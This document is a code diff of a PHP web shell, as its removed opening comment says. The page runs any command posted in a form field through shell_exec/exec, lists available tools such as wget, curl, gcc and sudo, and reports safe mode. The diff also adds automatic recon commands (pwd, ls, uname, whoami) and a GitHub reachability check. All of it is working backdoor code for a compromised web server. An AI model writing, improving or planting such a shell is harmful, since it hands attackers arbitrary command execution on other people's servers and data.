@@ -1,5 +1,19 @@
 <?php
-//first attempt at a php version webshell, do not judge me.
+
+function checkComs(){
+    $commands = array("perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
+    'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox', 'qemu', 'sudo', "git");
+    foreach ($commands as $item) {
+        echo '<pre>' . shell_exec("which " . $item) . "</pre>";
+    }
+}
+function cloner($repo){
+    if (!empty($repo)){
+        echo "<font style='background-color:white'>Git is ok, executing pull request on ".$repo."</font>";
+    }
+    
+}
+
 function checkSystem()
 {
     $os = array();
@@ -27,19 +41,15 @@ function showEnv($os)
 function executeCommands($com)
 {
     if (!empty($com)) {
-        echo '<div id="divider"></div><div id="returned-center" valign="bottom">
-    <article id="returned">
-        <div valign="bottom">
-        <textarea cols="80" rows="10">' . shell_exec($com) . '</textarea>
-        </div>
-    </article>
-</div>';
+        echo '<p style="padding:20px;margin:20px;background-color:white;"><b> ~~Command output: ~~</b></p><textarea cols="80" rows="10">' . exec($com) . '</textarea>';
     }
 }
 
 if ($_SERVER["REQUEST_METHOD"] == "POST"){
     if (!empty($_POST["commander"])){
         executeCommands($_POST["commander"]);
+    }if(!empty($_POST["clone"])){
+        cloner($_POST["clone"]);
     }else{
         echo "Empty post";
     }
@@ -49,7 +59,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST"){
 <html lang="en">
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <title>Yes</title>
+    <title>Slop</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
@@ -172,21 +182,36 @@ if ($_SERVER["REQUEST_METHOD"] == "POST"){
 <div id="container-mid">
     <div class="article-mid">
     <p><b>~ System Uname ~</b></p>
-        <pre> <?= php_uname() ?></pre><br>
-        <pre>Current working directory:<?= getcwd() ?></pre><br><br>
+    <td>
+        <tr><?=
+                $safemode = ini_get('safe_mode');
+                if ($safemode){
+                    echo implode("<p> <b>Safe Mode: </b><font color='red'>".$safemode."</font></p>");
+                }else{
+                    echo "<p> <b>Safe Mode is: </b><font style='text-color:green;background-color:lightgrey;'>off.</font</p>";
+                }
+                ?>
+            </tr><br>
+    </td>
     </div>
 </div>
 <div id="container-left">
     <article id="article-left">
         <h1 class="main_tool_label">~ System info's ~</h1>
         <div>
+        <?=
+        $h= '';
+        echo "<b>Can we reach it?</b>";
+        if( checkdnsrr('github.com', 'ANY') ){
+            echo "<p><font style='text-color: green;'>Github is Reachable!</font></p><form action='' method='post'><input type='text' name='clone'><input type='submit'></form>";
+        }else{
+            echo "<p><font style='text-color: red;'>Github is Not Reachable!</font></p>";
+        }
+        ?>
+        </div>
+        <div>
             <a><b>Avail Commands:</b><br><br>
-                <?=
-                $commands = array("perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
-                    'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox', 'qemu', 'sudo');
-                foreach ($commands as $item) {
-                    echo '<pre>' . shell_exec("which " . $item) . "</pre>";
-                }?>
+            <?= checkComs() ?>
                 <br></a>
         </div>
         <div>
@@ -204,13 +229,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST"){
         <div>
         </div>
         <div><a><br><b> ~ Execute ~ </b><br>
-                <form method="post" action="">
-                    <input type="text" name="commander" value="">
-                    <input type="submit" value="Execute">
-                </form>
-            </a>
+        <?php 
+        $base = 'echo "Current Dir: "; echo "";pwd;ls -lah;echo "System: "; echo "";uname -as;echo "User: ";echo "";whoami';
+        executeCommands($base);
+        ?>
+        <form method='post' action=''><input type='text' name='commander' value=''><input type='submit' value='Execute'></form>
         </div>
     </article>
 </div>
 </body>
 </html>
+
